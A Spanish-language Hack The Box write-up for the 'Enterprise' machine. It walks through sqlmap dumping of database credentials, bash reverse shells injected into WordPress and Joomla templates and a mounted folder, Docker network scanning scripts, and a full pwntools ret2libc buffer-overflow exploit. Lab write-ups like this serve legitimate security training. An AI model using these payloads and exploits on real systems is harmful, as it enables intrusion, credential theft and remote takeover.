---
title: "Enterprise"
description: "Enterprise"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/Enterprise

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.10.61
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217154115.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80,443,8080,32812 10.10.10.61
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217154318.png)

## Enumeracion

Encontramos un wordpress y econtramos un usuario valido, ademas de wp-login.php activo

Ver el certificado ssl

````
openssl s_client -connect 10.10.10.61:443
````

Encontramos un robots.txt y un joomla

### Fuzz

````
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.61/FUZZ
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217160447.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217160455.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217160913.png)

# Fase de ataque

## SQLI

Como podemos ver tenemos un plugin lcars que espera un parametro para hacer una query
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217161424.png)

### Sqlmap

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' --dbs
````

El parametrol QUERY es vulnerable a SQLI
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217162437.png)
Listar tablas joomla

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb --tables
````

Listar columnas

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb -T edz2g_users --columns
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217162825.png)
Listar datos de usuario y contraseña

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D joomladb -T edz2g_users -C username,password --dump
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217162939.png)
Wordpress db

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_users -C user_login,user_pass --dump
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217163317.png)Ver posts creados ocultos

````
sqlmap -u 'http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1' -D wordpress -T wp_posts -C post_content --dump
````

Entre los posts encontramos algunas contraseñas
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250217163936.png)

### Auth

Usando las contraseñas y los usuarios conseguidos probamos e iniciamos sesión

## WordPress

Apperance > Editor > 404.php

Inyectamos una reverse shell

````
system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'");
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218151701.png)
Lanzamos un 404 error
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218151726.png)
Nos ponemos en escucha

````
nc -lnvp 443
````

\[-\] ==pwned!==

````
script /dev/null -c bash
````

ctrl+z

````
stty raw -echo; fg
	reset xterm
````

````
export TERM=xterm
````

## Joomla

Extensions > Templates > Templates > (Template) > error.php
Inyectamos una reverse shell

````
system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'");
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218155852.png)
Nos ponemos en escucha

````
nc -lnvp 443
````

\[-\] ==pwned!==

````
script /dev/null -c bash
````

ctrl+z

````
stty raw -echo; fg
	reset xterm
````

````
export TERM=xterm
````

# Docker exit

Estamos dentro de un contenedor docker.

### Wordpress container

Dentro de wp-config.php
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218152230.png)

## Host discovery

````
#!/bin/bash

function ctrl_c(){
        echo -e "Saliendo"
        exit 1
}
trap ctrl_c INT

for i in $(seq 1 254); do
        timeout 1 bash  -c "ping -c 1 172.17.0.$i" &>/dev/null && echo "Host 172.17.0.$i activo" &
done; wait
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218154027.png)

## Port Discovery

````
#!/bin/bash

function ctrl_c(){
        echo -e "Saliendo"
        exit 1
}
trap ctrl_c INT

declare -a hosts=(172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4)

for host in ${hosts[@]}; do
		echo "Enumerando $host"
        for i in $(seq 1 10000); do
	        timeout 1 bash -c "echo '' > /dev/tcp/$host/$i" 2>/dev/null && echo "port $i activo" &
		done; wait
done
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218155433.png)

### Joomla container

En /var/www/html hay una montura desde la maquina real a el contenedor de una carpeta llamada files.

Podemos crear un php ejecutable que ejecute en la maquina real, ya que este php se puede ejeuctar al abrir el archivo en el navegador.

````
<?php
		system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'");
?>
````

 > 
 > base64 -w 0 test.php; echo

Nos ponemos en escucha

````
nc -lnvp 443
````

\[-\] ==pwned!==
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218161251.png)

# Privilege Escalation

Buscamos privilegios en suid

````
find \-perm -4000 2>/dev/null
````

Econtramos un binario /bin/lcars

Nos pasamos el binario

````
nc 10.10.14.11 < lcars
````

Miramos a bajo nivel el binario

````
ltrace ./lcars
````

lanzamos test y vemos que la password es picarda1
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250218163629.png)
Abrimos el binario con ghydra

## Buffer Overflow

### Ghydra

File > New project > Non-shared project > Finish
File > Import File > (binary) > ok

Arrastrar el binario al dragon

Abre el binario y lo analizas por defecto

Symbol Tree > Functions > main > Puedes ver el codigo en C

 > 
 > Puedes cambiar el nombre de las variables con letra "L"
 > Puedes seguir el flujo de las funciones con doble click

Se ve que compara el input del usuario con una variable=picarda1

La función scanf es vulnerable a buffer overflow y podemos observar que el buffer asignado es de 204
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250219150901.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Buffer%20Overflow.png)
RET = EIP = Instructor pointer (Apunta a la siguiente dirección del programa)

 > 
 > Ver protecciones del binario: checksec (binary)

### GDB-PEDA

Para ver el buffer y ver lo que vale EIP se puede ejecutar gdb.

1. Lanzamos 300 A para ver como el programa se corrompe
   gdb

````
r
- User input: <300*A>
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250219151101.png)
2. Descubrir cuantas A hay que meter para sobrescribir el EIP (offset)

````
pattern create 800
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250219152212.png)
3. Saber cuanto es el offset

````
pattern offset $eip
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250219152248.png)

### ret2libc

Conseguir que el EIP apunte a -> system_addr + exit_addr + bin_sh_addr

1. Lanzamos gdb en la maquina victima

````
gdb ./lcars -q
````

2. Miramos funciones

````
> info functions
````

3. breakpoint en main

````
b *main
````

4. Ejecutar el programa

````
r
````

5. Buscar la direccion de buffer de system, exit y sh

````
p system
p exit
find &system,+9999999,"sh"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250219153043.png)

### Automatizar el buffer overflow

````python
#!/usr/bin/python3

from pwn import *

def bufferOverflow():
	offset = 212 # Donde empieza el EIP
	junk = b"A"*offset # Basura para meter antes de sobrescribir el EIP

	system_addr = p32(0xf7e4c060) # Direccion obtenida de system
	exit_addr = p32(0xf7e3faf0) # Direccion obtenida de exit
	sh_addr = p32(0xf7f6ddd5) # Una direccion obtenida de sh

	payload = junk + system_addr + exit_addr + sh_addr

    # Ejecucion de comandos para llegar al BoF en el programa
    context(os='linux', arch='i386')
    host, port = "10.10.10.61", 32812
	
	r = remote(host,port) # Connect
	
	r.recvuntil(b"Enter Bridge Acces code:")
	r.sendline(b"picarda1")
	r.recvuntil(b"Waiting for input:")
	r.sendline(b"4")
	r.recvuntil(b"Enter Security Overrride:")
	r.sendline(payload)  # Lanzamos el payload AAAA...

	r.interactive()


if __name__ == '__main__':
	bufferOverflow()
````

Ejecutar

````
python3 exploit.py 
````

\[+\] ==pwned!==
